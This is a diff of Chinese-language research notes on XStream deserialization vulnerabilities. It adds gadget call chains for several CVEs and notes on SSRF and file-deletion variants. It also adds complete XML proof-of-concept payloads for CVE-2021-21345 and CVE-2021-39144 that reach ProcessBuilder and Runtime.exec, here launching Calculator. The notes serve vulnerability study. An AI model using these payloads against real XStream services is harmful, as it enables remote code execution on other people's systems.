@@ -1,4 +1,11 @@
-## XStream反序列化
+## XStream反序列化漏洞
+
+### 漏洞挖掘特点
+从某个`XXXConverter.unmarshal()`方法入手。看该unmarshal是否能调用到TreeMap.put()、HashMap.put()等反序列化常见调用点。例如
+CVE-2013-7285，将`TreeSetConverter.unmarshal()`作为入口，调用到TreeMap.put()。参照CC8的构造思路，向下寻找compare方法。      
+CVE-2020-26217，将`MapConverter.unmarshal()`作为入口，调用到HashMap.put()，参照CC6，可以向下从hash、hashCode入手进行构造。       
+CVE-2021-21345，将`AbstractReflectionConverter.unmarshal()`作为入口，调用PriorityQueue.readObject()，参照CommonsBeautils，可以向下从heapify、siftDownUsingComparator、compare入手构造。      
+CVE-2021-39144，将`AbstractReflectionConverter.unmarshal()`作为入口，调用PriorityQueue.readObject()，参照CommonsBeautils，siftDownComparable入手构造     
 
 ### CVE-2013-7285
 * Affected Version <= 1.4.6 (and 1.4.10)  
@@ -107,7 +114,7 @@ this.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComp
 ```
 # (3)
 protected void putCurrentEntryIntoMap(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, Map target) {
-    Object key = this.readItem(reader, context, map); // 这一步和(1)中的代码一样，对子标签开始上述反序列化过程。上述poc中的子标签是dynamic-proxy，对应转换器就是DynamicProxyConverter
+    Object key = this.readItem(reader, context, map); // 这一步和(1)中的代码一样，对子标签开始上述反序列化过程，获取标签对应的class类型。上述poc中的子标签是dynamic-proxy，对应转换器就是DynamicProxyConverter
     target.put(key, key);
 }
 ```
@@ -292,13 +299,200 @@ public boolean canConvert(Class type) {
 
 * #### 漏洞成因
 ```
-jdk.nashorn.internal.objects.NativeString#hashCode
-    com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString
-        javax.activation.DataHandler#getDataSource
-            com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream
-                javax.crypto.CipherInputStream#read -> getMoreData
-                    javax.crypto.NullCipher#update -> chooseFirstProvider
-                        javax.imageio.spi.FilterIterator#next
-                            javax.imageio.ImageIO.ContainsFilter#filter
-                                ProcessBuilder#start
+MapConverter.unmarshal()
+  MapConverter.populateMap()
+    MapConverter.putCurrentEntryIntoMap()
+      HashMap.put()
+        HashMap.hash()
+          jdk.nashorn.internal.objects.NativeString.hashCode()
+            jdk.nashorn.internal.objects.NativeString.getStringValue()
+              com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString()
+                com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get()
+                  com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx.readFrom()
+                    java.io.SequenceInputStream.read()
+                      java.io.SequenceInputStream.nextStream()
+                        javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator.nextElement()
+                          javax.imageio.spi.FilterIterator.next()
+                            javax.imageio.ImageIO$ContainsFilter.filter()
+                              ProcessBuilder#start
+```
+#### 补丁修复
+黑名单加入了java.lang.ProcessBuilder和javax.imageio.ImageIO$ContainsFilter
+
+虽然CVE-2020-26217修复后加入了上述黑名单，但是依旧可以用此链条在造成一些恶意攻击，例如CVE-2020-26258（SSRF）和CVE-2020-26259（任意文件删除）。二者和CVE-2020-26217的区别从`com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get()`这行调用开始。SSRF走向了`javax.activation.URLDataSource.getInputStream()`进而调用了URL类的openStream方法。任意文件删除则是走向了`com.sun.xml.internal.ws.util.ReadAllStream$FileStream.close()`
+
+在CVE-2020-26258之后的SSRF（CVE-2021-21342）底层依然用的`javax.activation.URLDataSource.getInputStream()`，但是上层则是结合了PriorityQueue。先来看一下PriorityQueue相关的RCE漏洞。
+
+### CVE-2021-21345
+* Affected Version <= 1.4.15
+* POC
+```
+<java.util.PriorityQueue serialization='custom'>
+  <unserializable-parents/>
+  <java.util.PriorityQueue>
+    <default>
+      <size>2</size>
+      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
+        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
+          <packet>
+            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
+              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
+                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
+                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
+                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
+                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>
+                      <uriProperties/>
+                      <attributeProperties/>
+                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
+                        <getter>
+                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>
+                          <name>verify</name>
+                          <parameter-types/>
+                        </getter>
+                      </inheritedAttWildcard>
+                    </bi>
+                    <tagName/>
+                    <context>
+                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
+                        <outer-class reference='../..'/>
+                      </marshallerPool>
+                      <nameList>
+                        <nsUriCannotBeDefaulted>
+                          <boolean>true</boolean>
+                        </nsUriCannotBeDefaulted>
+                        <namespaceURIs>
+                          <string>1</string>
+                        </namespaceURIs>
+                        <localNames>
+                          <string>UTF-8</string>
+                        </localNames>
+                      </nameList>
+                    </context>
+                  </bridge>
+                </bridge>
+                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>
+                  <activationCmd>open /System/Applications/Calculator.app</activationCmd>
+                </jaxbObject>
+              </dataSource>
+            </message>
+            <satellites/>
+            <invocationProperties/>
+          </packet>
+        </indexMap>
+      </comparator>
+    </default>
+    <int>3</int>
+    <string>javax.xml.ws.binding.attachments.inbound</string>
+    <string>javax.xml.ws.binding.attachments.inbound</string>
+  </java.util.PriorityQueue>
+</java.util.PriorityQueue>
+```
+
+#### 漏洞成因
+```
+AbstractReflectionConverter.unmarshal()
+  SerializationMembers.callReadObject()
+    SerializableConverter.doUnmarshal()
+      PriorityQueue.readObject()
+        PriorityQueue.heapify()
+          PriorityQueue.siftDown()
+            PriorityQueue.siftDownUsingComparator()
+              sun.awt.datatransfer.DataTransferer$IndexOrderComparator.compare()
+                sun.awt.datatransfer.DataTransferer$IndexedComparator.compareIndices()
+                  com.sun.xml.internal.ws.client.ResponseContext.get()
+                    com.sun.xml.internal.ws.api.message.MessageWrapper.getAttachments()
+                      com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getAttachments()
+                        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getMessage()
+                          com.sun.xml.internal.ws.message.JAXBAttachment.getInputStream()
+                            com.sun.xml.internal.ws.message.JAXBAttachment.asInputStream()
+                              com.sun.xml.internal.ws.message.JAXBAttachment.writeTo()
+                                com.sun.xml.internal.ws.db.glassfish.BridgeWrapper.marshal()
+                                  com.sun.xml.internal.bind.api.Bridge.marshal()
+                                    com.sun.xml.internal.bind.v2.runtime.BridgeImpl.marshal()
+                                      com.sun.xml.internal.bind.v2.runtime.MarshallerImpl.write()
+                                        com.sun.xml.internal.bind.v2.runtime.XMLSerializer.childAsXsiType()
+                                          com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl.serializeURIs()
+                                            com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection.get()
+                                              com.sun.corba.se.impl.activation.ServerTableEntry.verify()
+                                                ProcessBuilder.start()
+```
+
+CVE-2021-21342的SSRF还是走向`javax.activation.URLDataSource.getInputStream()`，替换了这个RCE的`com.sun.xml.internal.ws.message.JAXBAttachment.getInputStream()`。文件删除则是在`com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getMessage()`这步走向了不同的方向，
+```
+mpp = new MimeMultipartParser(this.dataSource.getInputStream(), this.dataSource.getContentType(), this.feature);      
+```
+
+
+<init>:275, File (java.io)
+close:-1, UnixDomainSocket (com.sun.deploy.net.socket)
+close:-1, DomainSocketNamedPipe (sun.plugin2.ipc.unix)
+implCloseChannel:139, FileChannelImpl (sun.nio.ch)
+close:115, AbstractInterruptibleChannel (java.nio.channels.spi)
+close:331, FileInputStream (java.io)
+makeProgress:239, MIMEMessage (com.sun.xml.internal.org.jvnet.mimepull)
+getHeaders:165, MIMEPart (com.sun.xml.internal.org.jvnet.mimepull)
+getContentType:157, MIMEPart (com.sun.xml.internal.org.jvnet.mimepull)
+getContentType:111, MIMEPartStreamingDataHandler$StreamingDataSource (com.sun.xml.internal.ws.encoding)
+getMessage:367, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)
+getAttachments:465, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)
+getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)
+
+
+
+### CVE-2021-39144
+* Affected Version <= 1.4.17
+* POC
+```
+<java.util.PriorityQueue serialization='custom'>
+  <unserializable-parents/>
+  <java.util.PriorityQueue>
+    <default>
+      <size>2</size>
+    </default>
+    <int>3</int>
+    <dynamic-proxy>
+      <interface>java.lang.Comparable</interface>
+      <handler class='sun.tracing.NullProvider'>
+        <active>true</active>
+        <providerType>java.lang.Comparable</providerType>
+        <probes>
+          <entry>
+            <method>
+              <class>java.lang.Comparable</class>
+              <name>compareTo</name>
+              <parameter-types>
+                <class>java.lang.Object</class>
+              </parameter-types>
+            </method>
+            <sun.tracing.dtrace.DTraceProbe>
+              <proxy class='java.lang.Runtime'/>
+              <implementing__method>
+                <class>java.lang.Runtime</class>
+                <name>exec</name>
+                <parameter-types>
+                  <class>java.lang.String</class>
+                </parameter-types>
+              </implementing__method>
+            </sun.tracing.dtrace.DTraceProbe>
+          </entry>
+        </probes>
+      </handler>
+    </dynamic-proxy>
+    <string>open /System/Applications/Calculator.app</string>
+  </java.util.PriorityQueue>
+</java.util.PriorityQueue>
+```
+
+#### 漏洞成因
+```
+AbstractReflectionConverter.unmarshal()
+  PriorityQueue.readObject()
+    PriorityQueue.heapify()
+      PriorityQueue.siftDown()
+        PriorityQueue.siftDownComparable()
+          com.sun.proxy.$Proxy0.compareTo()
+            sun.tracing.ProviderSkeleton.invoke()
+              sun.tracing.ProviderSkeleton.triggerProbe()
+                sun.tracing.dtrace.DTraceProbe.uncheckedTrigger()
+                  ProcessBuilder.start()
 ```
